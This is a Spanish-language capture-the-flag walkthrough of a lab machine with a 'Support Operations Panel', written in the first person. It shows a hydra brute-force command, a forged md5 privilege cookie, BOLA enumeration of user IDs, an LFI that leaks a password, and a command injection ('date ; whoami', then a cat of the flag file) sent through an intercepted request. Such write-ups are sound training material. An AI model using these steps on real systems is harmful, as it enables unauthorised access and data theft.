## Resumen

Esta maquina es de dificultad media en la que se trabaja el LFI, BOLA, fuerza bruta, Cookie manipulation y RCE.  

## Enumeracion

Empiezo haciendo un ping a la maquina para ver el TTL y asi poder hacerme una idea de que tipo de maquina es.
`ping -c 1 vmip`
`64 bytes from vmip: icmp_seq=1 ttl=62 time=27.3 ms
`
Con esto podemos ver un ttl de 62 asi que en principio la maquina es linux.

Sigo con nmap para escanear los puertos que tiene abiertos.
`nmap -sVC vmip`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 de:97:cc:f7:aa:66:11:be:7f:bb:15:65:83:c1:b7:5c (ECDSA)
|_  256 d7:57:58:87:53:24:27:3e:20:c6:ca:dd:c7:25:bb:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Support Operations Panel
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Podemos ver que tiene un ssh abierto en el puerto 22 y un apache en el puerto 80.

Decido ir a analizar el puerto 80 ya que es lo que la maquina pide.

## Analisis puerto 80

Al entrar veo que hay un panel de login para empleados y en el que dice que es un panel de soporte que maneja tickets, APIs internas, y diagnosticos del sistema. Veo que hay un correo de contacto si hay algun problema asi que decido usarlo para hacer un ataque de fuerza bruta.

Curl de la pagina:
`curl vmip`
```
<!DOCTYPE html>
<html>
<head>
    <title>Support Operations Panel</title>
    <link href="layout/bootstrap.min.css" rel="stylesheet">

    <style>
        body {
            background: linear-gradient(135deg, #0f172a, #1e293b);
            height: 100vh;
            color: #e5e7eb;
        }
        .brand-panel {
            padding: 80px;
        }
        .brand-panel h1 {
            font-weight: 700;
        }
        .login-panel {
            background: #f8fafc;
            color: #0f172a;
            padding: 50px;
            height: 100vh;
        }
        .login-panel input {
            border-radius: 0;
        }
        .login-panel button {
            border-radius: 0;
            background-color: #2563eb;
        }
        .security-note {
            font-size: 0.85rem;
            color: #475569;
        }
    </style>
</head>

<body>

<div class="container-fluid h-100">
    <div class="row h-100">


        <div class="col-md-7 brand-panel d-flex flex-column justify-content-center">
            <h1>Support Operations Panel</h1>
            <p class="lead mt-3">
                Internal platform for managing support operations,
                infrastructure access, and incident response.
            </p>

            <ul class="mt-4">
                <li>Ticket management</li>
                <li>Internal APIs</li>
                <li>System diagnostics</li>
            </ul>

            <p class="mt-5 text-warning">
                ⚠ Authorized personnel only. All actions are logged.
            </p>
        </div>


        <div class="col-md-5 login-panel d-flex flex-column justify-content-center">
            <h3 class="mb-4">Employee Authentication</h3>

            
            <form method="POST">
                <div class="mb-3">
                    <label class="form-label">Corporate Email</label>
                    <input type="email" name="email" class="form-control" placeholder="help@support.thm" required>
                </div>

                <div class="mb-4">
                    <label class="form-label">Password</label>
                    <input type="password" name="password" class="form-control" required>
                </div>

                <button class="btn btn-primary w-100">Sign In</button>
            </form>

            <p class="security-note mt-4">
                Problems signing in? Contact IT Operations @ help@support.thm
            </p>
        </div>

    </div>
</div>

</body>
</html>

```


Comando hydra:

`hydra -l  help@support.thm  -P /usr/share/wordlists/rockyou.txt vmip  http-post-form "/:email=^USER^&password=^PASS^:F=Invalid credentials"`

Resultado:

`[80][http-post-form] host: vmip   login: help@support.thm   password: snoopy`

Consigo las credenciales e inicio sesion.

## Cookie Manipulation

Al entrar solo veo que nos da un mensaje de bienvenida y un desplegable para cambiar el fondo de color. Parece un LFI pero por ahora no voy a investigar mas a fondo.

Me doy cuenta de que ahora se nos a añadido una cookie de nombre `IsITUser` esta en md5 asi que la paso por crackstation para ver si da resultados.

`68934a3e9455fa72420237eb05902327`
`Result: false`

Veo que la cookie tiene false parece que es lo que le dice a la aplicacion que privilegios tenemos, asi que lo cambio a true para ver si nos desbloquea cosas.

`b326b5062b2f0e69046810717534cb09`


## BOLA API (Broken Object Level Authorization) 

Y al reiniciar la pagina nos sale un panel de administrador de IT y para ver la API.

![Pasted image 20260926000029](imagenes/Pasted%20image%2020260926000029.png)

Al entrar pone que como usuario de helpdesk podemos hacer una consulta a la API de nuestro perfil con.
`/user/3`
![Pasted image 20260926000346](imagenes/Pasted%20image%2020260926000346.png)


Decido hacer la consulta pero cambiando el id del usuario para ver si hay BOLA y al hacerlo.
![Pasted image 20260926000504](imagenes/Pasted%20image%2020260926000504.png)

Consigo acceder a la informacion de otros usuarios, este dice que es admin asi que me apunto su gmail para mas adelante.

## LFI

Vuelvo a investigar mas a fondo el posible LFI en los colores de los temas.

Al cambiar de tema se cambia la URL.
`/dashboard.php?skin=red`

Empiezo a probar varios payloads y no veo cambios hasta que pongo `../config` y veo que cambia ligeramente la web.

Y al abrir el codigo fuente veo que hay una contraseña expuesta.
`$MASTER_PASSWORD = 'support@110';`

Voy a probar las crendenciales con el gmail del administrador antes conseguido. 

Tuve varios problemas ya que la contraseña no funcionaba pero al final la solucion era quitando el `@`.

Al iniciar sesión con la cuenta de administrador consigo la primera flag. 

![Pasted image 20260926003027](imagenes/Pasted%20image%2020260926003027.png)


## RCE (Command injection)


Al entrar solo veo un cambio nuevo que es que al lado de los temas se a añadido otro desplegable para la fecha y la hora asi que decido investigarlo.

`<form method="POST" id="sysForm"> <select name="sys" class="form-select" onchange="document.getElementById('sysForm').submit();"> <option value="date" selected> Date </option> <option value='date +"%H:%M:%S"' > Time </option> </select> </form> </div> </div>`

Viendo el codigo sea muy probable que haga una llamada al sistema para ejecutar el comando date y asi enseñar la hora. 

Me pongo a interceptar con BurpSuite e intercepto la peticion que manda a la hora de elegir la hora.
```
POST /dashboard.php HTTP/1.1
Host: vmip
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://vmip
Connection: keep-alive
Referer: http://vmip/dashboard.php
Cookie: isITUser=b326b5062b2f0e69046810717534cb09; PHPSESSID=7hrqc3l7ap9hnma56eo3ehj4ja
Upgrade-Insecure-Requests: 1
Priority: u=0, i

sys=date+%2B%22%25H%3A%25M%3A%25S%22
```

Cambio el comando de `sys=` por `date ; whoami` para comprobar el RCE ya que parecia que lo que estaba haciendo era mandar una peticion al sistema sin sanitizar nada.
`Fri Sep 25 22:40:48 UTC 2026 www-data`

Veo que se puedo injectar el comando asi que prosigo con `cat /home/ubuntu/user.txt` para asi poder conseguir la flag.

`Fri Sep 25 22:42:28 UTC 2026
`THM{*****}`

**Tuve varios problemas ya que intente usar una revshell pero no funcionaban, asi que opte por intentar leer el archivo desde la peticion de Burp y dejo.** 
